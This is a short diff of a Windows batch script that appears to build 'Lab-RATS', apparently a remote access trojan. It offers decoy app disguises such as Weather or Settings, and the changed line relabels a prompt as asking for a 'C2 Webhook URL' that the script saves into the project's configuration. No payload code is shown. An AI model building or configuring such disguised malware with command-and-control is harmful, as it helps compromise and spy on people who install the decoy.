@@ -120,7 +120,7 @@ echo     3. Weather               4. Settings
 echo     5. Lab-RATS Logo
 set /p "DECOY_CHOICE=    Choice (Default 1): "
 if "!DECOY_CHOICE!"=="" set "DECOY_CHOICE=1"
-set /p "WEB_URL=    Enter Webhook URL: "
+set /p "WEB_URL=    Enter C2 Webhook URL (Google Script or Render): "
 if not "!WEB_URL!"=="" (
     powershell -Command "Add-Content '%PROJECT_DIR%\local.properties' '`nWEBHOOK_URL=!WEB_URL!'"
 )
